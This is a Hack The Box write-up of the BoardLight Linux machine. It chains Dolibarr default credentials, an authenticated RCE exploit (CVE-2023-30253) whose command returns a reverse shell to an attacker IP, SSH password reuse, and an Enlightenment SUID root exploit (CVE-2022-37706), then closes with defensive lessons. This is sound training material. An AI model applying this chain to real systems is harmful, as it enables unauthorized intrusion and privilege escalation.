---
title: "BoardLight — Dolibarr RCE to Enlightenment Privilege Escalation"
description: "Virtual host enumeration reveals a Dolibarr CRM instance with default credentials; authenticated RCE, credential reuse, and an Enlightenment SUID flaw chain to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - default-credentials
  - privesc
  - cve
---

## Summary

BoardLight is an Easy Linux (Ubuntu 20.04) machine where virtual host enumeration reveals a Dolibarr 17.0.0 CRM instance accessible via default credentials. Exploitation chains authenticated remote code execution, credential reuse for SSH lateral movement, and a privilege escalation vulnerability in the Enlightenment window manager to obtain root.

## Context and Objective

The target runs Apache 2.4.41 on port 80 and OpenSSH 8.2p1 on port 22. The objective is to identify exploitable services and escalate from an initial foothold to root.

## Approach and Evidence

### Port Scanning and Virtual Host Discovery

Standard port scanning revealed HTTP and SSH services. The web page exposed a domain email, prompting virtual-host discovery. Virtual host enumeration with Gobuster identified `<APPLICATION_VHOST>` hosting Dolibarr 17.0.0:

```text
gobuster vhost --url http://<TARGET_VHOST> --wordlist <WORDLIST> --append-domain
```

```text
<APPLICATION_VHOST>
```

The Dolibarr instance accepted default credentials (`<DEFAULT_USER>:<DEFAULT_PASSWORD>`), granting administrative access to the CRM interface.

### CVE-2023-30253 — Authenticated Remote Code Execution

Dolibarr 17.0.0 is vulnerable to authenticated RCE via CVE-2023-30253. The built-in website editor allows injection of PHP code that executes server-side:

```text
python3 exploit.py http://<APPLICATION_VHOST> <USER> <PASSWORD> <ATTACKER_IP> <PORT>
```

The exploit returned a shell as `www-data`:

```text
<WEB_SERVICE_USER>@<TARGET_HOST>:~$
```

### Credential Discovery and Lateral Movement

Inspecting the Dolibarr configuration file at `<APPLICATION_CONFIG_PATH>` revealed database credentials:

```php
$dolibarr_main_db_user='<DB_USER>';
$dolibarr_main_db_pass='<DB_PASSWORD>';
```

The database password was reused for the local `<LOCAL_USER>` user, enabling SSH access:

```text
sshpass -p '<DB_PASSWORD>' ssh <LOCAL_USER>@<TARGET_HOST>
```

```text
<LOCAL_USER>@<TARGET_HOST>:~$
```

### CVE-2022-37706 — Enlightenment Privilege Escalation

SUID binary enumeration identified several Enlightenment helper binaries, including `enlightenment_sys`. The installed version (0.23.1) is vulnerable to CVE-2022-37706, which allows arbitrary command execution through the setuid helper:

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

```text
dpkg -l | grep enl
hi  enlightenment  0.23.1-4  amd64  X11 window manager based on EFL
```

Running the public exploit script against `enlightenment_sys` returned a root shell:

```text
# whoami
root
```

## Challenges and Decisions

The primary challenge was identifying the virtual host hosting the Dolibarr instance; the main site offered no useful attack surface. The exploitation chain relied on default credentials and password reuse, both common in real environments. The Enlightenment SUID vulnerability was an unconventional privilege escalation vector compared to standard kernel exploits.

## Outcome

User-level and root-level objectives were obtained. The attack chain demonstrated how default credentials, configuration file secrets, and overlooked SUID binaries can be chained from initial foothold to full system compromise.

## Lessons and Recommendations

- Change default credentials on all deployed applications before production use.
- Store database credentials in environment variables or secrets managers, not plaintext configuration files.
- Audit setuid binaries regularly; desktop environment helpers are frequently overlooked privilege escalation surfaces.
- Virtual host enumeration should be a standard step when the primary web server reveals no immediate attack surface.

## References

- [CVE-2023-30253 — Dolibarr Authenticated RCE](https://nvd.nist.gov/vuln/detail/CVE-2023-30253)
- [CVE-2022-37706 — Enlightenment Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)
